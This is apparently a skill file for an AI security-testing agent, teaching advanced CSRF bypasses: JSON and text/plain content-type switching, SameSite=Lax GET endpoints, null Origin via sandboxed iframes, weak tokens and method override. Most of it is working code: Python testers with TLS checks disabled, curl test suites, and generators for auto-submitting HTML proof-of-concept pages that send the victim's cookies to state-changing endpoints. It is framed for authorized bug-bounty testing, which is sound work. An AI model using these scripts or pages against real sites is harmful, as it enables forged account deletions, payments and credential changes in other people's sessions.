<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: csrf-advanced-bypass
description: Advanced CSRF bypass techniques beyond standard token removal — JSON content-type bypass, SameSite Lax exploitation, null Origin bypass, method override, parser differential attacks, and CSRF chains for maximum impact
---

# CSRF Advanced Bypass Techniques

Standard CSRF testing (remove token, submit, check if accepted) catches only the most obvious misconfigurations. Production applications often implement CSRF tokens correctly for their primary use case but fail on edge cases: content-type switching, method overrides, parser differentials, or SameSite miscalculations.

This skill covers the non-obvious bypass paths that automated scanners miss entirely.

---

## BYPASS CLASS 1 — JSON Content-Type CSRF (Most Common)

**The vulnerability:** CSRF middleware typically protects `application/x-www-form-urlencoded` and `multipart/form-data` requests. Requests with `application/json` are often exempt because "JSON can't be sent cross-origin without a preflight." This assumption breaks when:
1. The server accepts JSON without checking CSRF token
2. The JS fetch API `mode: "no-cors"` allows sending `text/plain` which some servers auto-parse as JSON
3. The middleware skips validation for JSON content-type explicitly

**Test methodology:**

```python
# tools/csrf_json_bypass.py
"""
Test for JSON Content-Type CSRF bypass.

The key insight: if an endpoint accepts BOTH form submissions (with CSRF) AND JSON (without CSRF),
the JSON variant has no CSRF protection.

Steps:
1. Identify state-changing endpoints that accept application/json
2. Confirm CSRF token is NOT validated for JSON requests
3. Demonstrate cross-origin exploitability
"""
import urllib.request, urllib.error, ssl, json, re

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def test_json_csrf_bypass(endpoint_url, json_payload, session_cookie=None):
    """
    Test if JSON POST to endpoint bypasses CSRF protection.
    Returns True if CSRF is not enforced for JSON.
    """
    # Step 1: First get the CSRF token to understand what it looks like
    base_url = re.match(r'(https?://[^/]+)', endpoint_url).group(1)
    csrf_token = None
    try:
        req = urllib.request.Request(base_url + "/",
            headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=8, context=ctx) as r:
            body = r.read(5000).decode('utf-8', 'ignore')
            cookies = r.headers.get('Set-Cookie', '')
            token_match = re.search(r'(?:csrf|_token|xsrf)[^"\']*["\']([a-zA-Z0-9._\-+/=]{10,100})["\']',
                body, re.I)
            if token_match:
                csrf_token = token_match.group(1)
                print(f"Found CSRF token in HTML: {csrf_token[:20]}...")
    except Exception:
        pass

    results = {}

    # Step 2: Test JSON request WITHOUT CSRF token
    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
    if session_cookie:
        headers["Cookie"] = session_cookie

    req = urllib.request.Request(
        endpoint_url,
        data=json.dumps(json_payload).encode(),
        headers=headers,
        method="POST"
    )
    try:
        with urllib.request.urlopen(req, timeout=8, context=ctx) as r:
            body = r.read(1000).decode('utf-8', 'ignore')
            results["json_no_csrf"] = {"status": r.status, "body": body[:200]}
            print(f"[JSON, no CSRF token] {r.status}: {body[:150]}")
    except urllib.error.HTTPError as e:
        body = e.read(500).decode('utf-8', 'ignore')
        results["json_no_csrf"] = {"status": e.code, "body": body[:200]}
        print(f"[JSON, no CSRF token] {e.code}: {body[:150]}")

    # Step 3: Test text/plain request (bypasses preflight, some servers parse as JSON)
    req2 = urllib.request.Request(
        endpoint_url,
        data=json.dumps(json_payload).encode(),
        headers={**headers, "Content-Type": "text/plain"},
        method="POST"
    )
    try:
        with urllib.request.urlopen(req2, timeout=8, context=ctx) as r:
            body = r.read(1000).decode('utf-8', 'ignore')
            results["text_plain"] = {"status": r.status, "body": body[:200]}
            print(f"[text/plain, no CSRF] {r.status}: {body[:150]}")
    except urllib.error.HTTPError as e:
        body = e.read(500).decode('utf-8', 'ignore')
        results["text_plain"] = {"status": e.code, "body": body[:200]}
        print(f"[text/plain, no CSRF] {e.code}: {body[:150]}")

    # Step 4: Compare against form submission WITH CSRF (baseline)
    if csrf_token:
        import urllib.parse
        form_data = urllib.parse.urlencode({**json_payload, "_csrf": csrf_token}).encode()
        req3 = urllib.request.Request(
            endpoint_url,
            data=form_data,
            headers={**headers, "Content-Type": "application/x-www-form-urlencoded"},
            method="POST"
        )
        try:
            with urllib.request.urlopen(req3, timeout=8, context=ctx) as r:
                body = r.read(500).decode('utf-8', 'ignore')
                results["form_with_csrf"] = {"status": r.status, "body": body[:200]}
                print(f"[Form + CSRF token] {r.status}: {body[:100]}")
        except urllib.error.HTTPError as e:
            results["form_with_csrf"] = {"status": e.code}

    # Analyze results
    json_status = results.get("json_no_csrf", {}).get("status", 0)
    form_status = results.get("form_with_csrf", {}).get("status", 0)

    if json_status in (200, 201, 202) or (json_status == 200 and form_status == 200):
        print(f"\n[BYPASS CONFIRMED] JSON POST accepted without CSRF token!")
        print(f"  Endpoint: {endpoint_url}")
        print(f"  JSON status: {json_status}")
        print(f"  Form+CSRF status: {form_status}")
        return True
    elif json_status == 415:
        print(f"\n[HINT] 415 Unsupported Media Type — server uses different content-type for JSON")
        print(f"  Try: application/vnd.api+json or application/x-www-form-urlencoded")
    elif json_status == 400:
        print(f"\n[PARTIAL] 400 Bad Request — CSRF not enforced but payload rejected")
        print(f"  Refine the JSON payload structure to match the expected schema")
        # 400 often means CSRF passed but validation failed → CSRF IS bypassed
        json_body = results.get("json_no_csrf", {}).get("body", "")
        if "csrf" not in json_body.lower() and "token" not in json_body.lower():
            print(f"  LIKELY BYPASS: 400 is not a CSRF error, it's a validation error")
            return True

    return False

def generate_csrf_poc(endpoint_url, json_payload, attack_description):
    """Generate a self-contained HTML proof-of-concept for CSRF"""
    payload_str = json.dumps(json_payload)

    poc = f"""<!DOCTYPE html>
<!-- CSRF PoC: {attack_description} -->
<!-- Auto-submits on page load. For authorized bug bounty testing only. -->
<html>
<body>
<h1>CSRF PoC: {attack_description}</h1>
<p>This page automatically sends a cross-origin request to demonstrate CSRF.</p>

<script>
// Method 1: JSON fetch (works when CSRF token not enforced on JSON)
fetch("{endpoint_url}", {{
    method: "POST",
    headers: {{"Content-Type": "application/json"}},
    body: JSON.stringify({payload_str}),
    credentials: "include",  // Sends cookies cross-origin
    mode: "no-cors"          // Prevents CORS error (response not read)
}})
.then(() => console.log("Request sent"))
.catch(e => console.error(e));

// Method 2: text/plain (no preflight, may be parsed as JSON by server)
// Uncomment if Method 1 doesn't work:
/*
fetch("{endpoint_url}", {{
    method: "POST",
    headers: {{"Content-Type": "text/plain"}},
    body: JSON.stringify({payload_str}),
    credentials: "include",
    mode: "no-cors"
}});
*/
</script>
</body>
</html>"""
    return poc
```

---

## BYPASS CLASS 2 — SameSite Lax GET-Based State Change

```python
# tools/csrf_samesite_lax.py
"""
SameSite=Lax cookies are sent on top-level cross-site GET navigation.
If any state-changing endpoint accepts GET requests, it's CSRFable even with SameSite=Lax.

Detection: Find GET endpoints that cause state changes.
"""
import urllib.request, urllib.error, ssl

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

STATE_CHANGE_INDICATORS = [
    # URLs that sound like GET-based state changes
    "/logout", "/signout", "/sign-out", "/log-out",
    "/delete", "/remove", "/unsubscribe", "/cancel",
    "/confirm", "/approve", "/verify", "/activate",
    "/disable", "/enable", "/block", "/unblock",
    "/disconnect", "/revoke", "/reset",
    # Email change confirmation links (common in GET-based flows)
    "/email/confirm", "/email/change", "/email/verify",
    # Password reset via GET
    "/password/reset", "/account/delete",
]

def test_get_state_change(base_url):
    """Test if any GET endpoints cause state changes (SameSite=Lax bypass surface)"""
    findings = []

    for path in STATE_CHANGE_INDICATORS:
        url = base_url.rstrip('/') + path
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        try:
            with urllib.request.urlopen(req, timeout=8, context=ctx) as r:
                # GET that returns 200 with state change = CSRFable
                findings.append({"url": url, "status": r.status, "method": "GET"})
                print(f"[GET {r.status}] {url} — potential state change endpoint")
        except urllib.error.HTTPError as e:
            if e.code in (302, 301):
                # Redirect might indicate successful action
                loc = e.headers.get('Location', '')
                print(f"[GET {e.code}→{loc[:60]}] {url}")
                findings.append({"url": url, "status": e.code, "redirect": loc})
        except Exception:
            pass

    return findings

def generate_samesite_lax_poc(state_change_url):
    """Generate PoC for SameSite=Lax GET bypass"""
    return f"""<!DOCTYPE html>
<!-- CSRF via SameSite=Lax top-level navigation -->
<html>
<body>
<!-- Top-level navigation sends SameSite=Lax cookies -->
<img src="{state_change_url}" style="display:none"
     onerror="console.log('request sent')" />

<!-- Alternative: form-based GET -->
<form id="csrf" action="{state_change_url}" method="GET">
  <input type="submit" value="Click Me" />
</form>
<!-- Auto-submit: -->
<script>document.getElementById('csrf').submit();</script>
</body>
</html>"""
```

---

## BYPASS CLASS 3 — Null Origin Bypass

```python
# tools/csrf_null_origin.py
"""
Some servers accept requests with Origin: null.
This can be triggered from sandboxed iframes (sandbox attribute without allow-same-origin).

Exploit:
<iframe sandbox="allow-scripts allow-forms" srcdoc="..."></iframe>
The iframe has null Origin. If server accepts null Origin = CSRF bypass.
"""
import urllib.request, urllib.error, ssl

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def test_null_origin(endpoint_url, payload_data, session_cookie=None):
    """Test if server accepts requests with Origin: null"""
    headers = {
        "Origin": "null",
        "Referer": "",  # No referer from sandboxed iframe
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0"
    }
    if session_cookie:
        headers["Cookie"] = session_cookie

    req = urllib.request.Request(
        endpoint_url,
        data=payload_data.encode() if isinstance(payload_data, str) else payload_data,
        headers=headers,
        method="POST"
    )
    try:
        with urllib.request.urlopen(req, timeout=8, context=ctx) as r:
            body = r.read(500).decode('utf-8', 'ignore')
            if r.status in (200, 201, 202):
                print(f"[NULL ORIGIN BYPASS] {endpoint_url}: {r.status}")
                print(f"  Response: {body[:150]}")
                return True
    except urllib.error.HTTPError as e:
        body = e.read(300).decode('utf-8', 'ignore')
        if e.code not in (401, 403):
            print(f"[{e.code}] {endpoint_url}: {body[:100]}")
    return False

def generate_null_origin_poc(endpoint_url, form_params):
    """Generate sandboxed iframe PoC with null Origin"""
    import urllib.parse
    form_fields = "\n".join(
        f'<input name="{k}" value="{v}">' for k, v in form_params.items()
    )

    return f"""<!DOCTYPE html>
<!-- CSRF via null Origin (sandboxed iframe) -->
<html>
<body>
<iframe sandbox="allow-scripts allow-forms" style="display:none"
  srcdoc='
    <form id="csrf" action="{endpoint_url}" method="POST">
      {form_fields}
    </form>
    <script>document.getElementById("csrf").submit();</script>
  '>
</iframe>
</body>
</html>"""
```

---

## BYPASS CLASS 4 — Token Weakness Patterns

```python
# tools/csrf_token_analysis.py
"""
CSRF token weakness testing:
1. Token not bound to session (works across sessions)
2. Token not bound to user (works across users)
3. Token in GET parameter (logged, cacheable)
4. Token predictable (timestamp-based, sequential)
5. Token length too short (<16 bytes entropy)
6. Double submit cookie bypass (token matches cookie but neither is validated server-side)
"""
import urllib.request, urllib.error, ssl, re, hashlib, time, base64

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def analyze_csrf_token(token_string):
    """Analyze a CSRF token for weakness indicators"""
    analysis = {"token": token_string, "weaknesses": []}

    # Length check
    if len(token_string) < 20:
        analysis["weaknesses"].append(f"SHORT: Only {len(token_string)} chars — insufficient entropy")

    # Entropy check: is it high entropy or patterned?
    import string
    charset = set(token_string)
    if len(charset) < 10:
        analysis["weaknesses"].append(f"LOW_CHARSET: Only {len(charset)} unique chars")

    # Timestamp-based check: try to decode as base64 or hex
    try:
        decoded = base64.b64decode(token_string + "==").hex()
        # Check if first 4 bytes could be a timestamp
        ts_candidate = int(decoded[:8], 16)
        if 1600000000 < ts_candidate < 2000000000:  # Unix timestamp range
            analysis["weaknesses"].append(f"TIMESTAMP_BASED: Decodes to timestamp {ts_candidate}")
    except Exception:
        pass

    # JWT-like token (these have different validation rules)
    if token_string.count('.') == 2:
        analysis["weaknesses"].append("JWT_FORMAT: Token looks like a JWT — test algorithm confusion")

    # Sequential check: if token contains incrementing numbers
    digits = re.findall(r'\d+', token_string)
    for d in digits:
        if len(d) > 6:
            analysis["weaknesses"].append(f"CONTAINS_SEQUENCE: {d} — may be sequential")

    return analysis

def test_token_cross_session(endpoint_url, token_from_session_a, session_b_cookie):
    """
    Test if CSRF token from session A works in session B.
    If yes: token is not session-bound (high severity).
    """
    import urllib.parse
    data = urllib.parse.urlencode({"_csrf": token_from_session_a, "test": "1"}).encode()

    req = urllib.request.Request(
        endpoint_url, data=data,
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": session_b_cookie,
            "User-Agent": "Mozilla/5.0"
        },
        method="POST"
    )
    try:
        with urllib.request.urlopen(req, timeout=8, context=ctx) as r:
            print(f"[CROSS-SESSION BYPASS] Token from session A accepted in session B!")
            return True
    except urllib.error.HTTPError as e:
        if e.code == 403:
            body = e.read(200).decode('utf-8', 'ignore')
            if "csrf" in body.lower() or "token" in body.lower():
                print(f"[PROTECTED] Token correctly bound to session")
            else:
                print(f"[INVESTIGATE] 403 but not CSRF-related — different protection mechanism")
    return False
```

---

## BYPASS CLASS 5 — Method Override CSRF

```bash
# Test HTTP method override headers
# Some frameworks honor these even without CSRF tokens

TARGET_URL="https://TARGET/api/endpoint"
SESSION_COOKIE="session=VALUE"

# X-HTTP-Method-Override
curl -sk -X POST "$TARGET_URL" \
  -H "X-HTTP-Method-Override: DELETE" \
  -H "Cookie: $SESSION_COOKIE" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "id=1" -v 2>&1 | grep -E "HTTP/|location|content-type"

# _method parameter (Rails, PHP frameworks)
curl -sk -X POST "$TARGET_URL" \
  -H "Cookie: $SESSION_COOKIE" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "_method=DELETE&id=1" -v 2>&1 | grep -E "HTTP/|location"

# X-Method-Override
curl -sk -X POST "$TARGET_URL" \
  -H "X-Method-Override: PATCH" \
  -H "Cookie: $SESSION_COOKIE" \
  -H "Content-Type: application/json" \
  -d '{"test":1}' -v 2>&1 | grep "HTTP/"
```

---

## Complete CSRF Bypass Testing Checklist

```bash
# Run the complete bypass test suite against a specific endpoint
TARGET_ENDPOINT="https://TARGET/api/sensitive-action"
SESSION_COOKIE="cookie_name=cookie_value"

echo "=== CSRF Bypass Test Suite ==="
echo "Target: $TARGET_ENDPOINT"
echo ""

echo "1. JSON Content-Type (no CSRF token)..."
curl -sk -X POST "$TARGET_ENDPOINT" \
  -H "Content-Type: application/json" \
  -H "Cookie: $SESSION_COOKIE" \
  -d '{"action":"test"}' -o /dev/null -w "[JSON] Status: %{http_code}\n"

echo "2. text/plain Content-Type..."
curl -sk -X POST "$TARGET_ENDPOINT" \
  -H "Content-Type: text/plain" \
  -H "Cookie: $SESSION_COOKIE" \
  -d '{"action":"test"}' -o /dev/null -w "[text/plain] Status: %{http_code}\n"

echo "3. Null Origin..."
curl -sk -X POST "$TARGET_ENDPOINT" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Origin: null" \
  -H "Cookie: $SESSION_COOKIE" \
  -d "action=test" -o /dev/null -w "[Null Origin] Status: %{http_code}\n"

echo "4. Missing Origin header..."
curl -sk -X POST "$TARGET_ENDPOINT" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: $SESSION_COOKIE" \
  -d "action=test&_csrf=INVALID" -o /dev/null -w "[Invalid CSRF token] Status: %{http_code}\n"

echo "5. Missing CSRF token entirely..."
curl -sk -X POST "$TARGET_ENDPOINT" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: $SESSION_COOKIE" \
  -d "action=test" -o /dev/null -w "[No CSRF token] Status: %{http_code}\n"

echo "6. Empty CSRF token..."
curl -sk -X POST "$TARGET_ENDPOINT" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: $SESSION_COOKIE" \
  -d "action=test&_csrf=" -o /dev/null -w "[Empty CSRF token] Status: %{http_code}\n"

echo "7. Method override..."
curl -sk -X POST "$TARGET_ENDPOINT?_method=DELETE" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: $SESSION_COOKIE" \
  -d "action=test" -o /dev/null -w "[Method Override] Status: %{http_code}\n"
```

---

## Impact Escalation Matrix

| Bypass Found | Impact | Severity |
|-------------|--------|----------|
| JSON bypass on /api/delete-account | Full account deletion without user interaction | HIGH |
| JSON bypass on /api/payment | Unauthorized payment initiation | CRITICAL |
| JSON bypass on /api/profile | Email/password change | HIGH |
| JSON bypass on internal VAT API | Unrestricted API abuse | LOW |
| Null Origin on /api/admin/* | Admin action execution | CRITICAL |
| SameSite=Lax GET logout | Force logout (DoS-level) | LOW-MEDIUM |
| Token not session-bound | Phishing-based CSRF without own account | MEDIUM |

---

## Pro Tips

1. **Always test JSON CSRF first** — it's the most common modern CSRF bypass and automated scanners never catch it.
2. **400 ≠ CSRF protected** — A 400 "Bad Request" after JSON submission usually means CSRF passed validation but the payload was wrong. Refine the payload, not the CSRF approach.
3. **415 Unsupported Media Type** — The endpoint doesn't accept JSON but CSRF is bypassed via `text/plain`. Both can carry the same payload.
4. **Check framework-specific protection** — Express `csurf` middleware can be configured to exclude JSON content-type. Javalin, Spring, Rails all have different default behaviors.
5. **For internal services with CSRF** — Internal services often implement CSRF tokens for their HTML forms but forget to enforce them for programmatic API access from other services. JSON bypass is even more likely here.
6. **Combine with CORS wildcard** — If an endpoint has CORS `Access-Control-Allow-Origin: *` AND no CSRF protection for JSON, the impact is highest: full read/write from any origin.
